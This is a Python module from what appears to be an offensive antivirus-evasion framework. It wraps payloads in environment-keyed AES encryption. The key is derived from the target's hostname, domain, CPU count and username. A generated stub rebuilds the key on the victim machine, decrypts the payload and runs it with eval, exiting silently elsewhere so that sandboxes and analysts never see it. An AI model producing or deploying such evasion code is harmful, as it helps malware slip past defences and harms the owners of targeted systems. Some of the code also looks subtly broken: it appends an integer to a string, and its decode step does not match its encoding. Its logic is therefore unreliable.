from tools.evasion.evasion_common import evasion_helpers
import hashlib
from Crypto.Cipher import AES
from lib.common import helpers
import base64


def check_options_python(evasion_payload):
    
    key = ""
    rand_key_name = evasion_helpers.randomString()
    build_code = rand_key_name + '= ""\n'

    if evasion_payload.required_options["HOSTNAME"][0].lower() != "x":

        #Each case will follow this pattern: 
        # - add attr value to key string
        # - add dependencies to check for this attr value in script
        # - add attr value in script to key string
        key += evasion_payload.required_options["HOSTNAME"][0].lower()
        build_code += 'import platform\n'
        build_code += rand_key_name + ' += platform.node().lower()\n'       

    if evasion_payload.required_options["DOMAIN"][0].lower() != "x":

        key += evasion_payload.required_options["DOMAIN"][0].lower()
        build_code +=  'import socket\n'
        build_code +=  rand_key_name + ' += socket.getfqdn().lower()\n'

    if evasion_payload.required_options["PROCESSORS"][0].lower() != "x":

        key += evasion_payload.required_options["PROCESSORS"][0].lower()
        build_code += 'import multiprocessing\n'
        build_code +=  rand_key_name + ' += multiprocessing.cpu_count()\n'

    if evasion_payload.required_options["USERNAME"][0].lower() != "x":

        key += evasion_payload.required_options["USERNAME"][0].lower()
        build_code += 'import getpass\n'
        build_code += rand_key_name + ' += getpass.getuser().lower()\n'

    if key:
        key = hashlib.md5(key.encode()).hexdigest()
        build_code += 'import hashlib\n'
        build_code += rand_key_name + ' = hashlib.md5(' + rand_key_name + '.encode()).hexdigest()\n'

    # Return check information
    return key, rand_key_name, build_code

def encrypt_payload_python(evasion_payload, payload_code):

    #If hostname, processor count, domain or username is provided, 
    # build a key for aes encrypting the entire payload.
    key, rand_key_name, build_code = check_options_python(evasion_payload)

    #If a key exists, encrypt the provided payload and add logic to outfile
    # python string for dynamically generating the AES key and decrypting payload.
    if key:
        RandPayloadName = evasion_helpers.randomString()
        RandCipherObject = evasion_helpers.randomString()
        while len(payload_code) % 16 != 0:
            payload_code += '\n'
        iv = helpers.randomString(16)
        aes_cipher_object = AES.new(key, AES.MODE_CBC, iv)
        encrypted_payload = base64.b64encode(aes_cipher_object.encrypt(payload_code)).decode()
        payload_code = ""
        payload_code += build_code
        payload_code += RandPayloadName + ' = \'' + encrypted_payload + '\'\n'
        payload_code += 'from Crypto.Cipher import AES\n'
        payload_code += 'import base64\n'
        payload_code += RandCipherObject + ' = AES.new(' + rand_key_name + ', AES.MODE_CBC, \'' + iv + '\')\n'
        payload_code += 'try:\n'
        payload_code += '\t' + 'eval(base64.b64decode(' + RandCipherObject + '.decrypt(' + RandPayloadName + ')).decode())\n'
        payload_code += 'except:\n'
        payload_code += '\timport sys;sys.exit()\n'

    return payload_code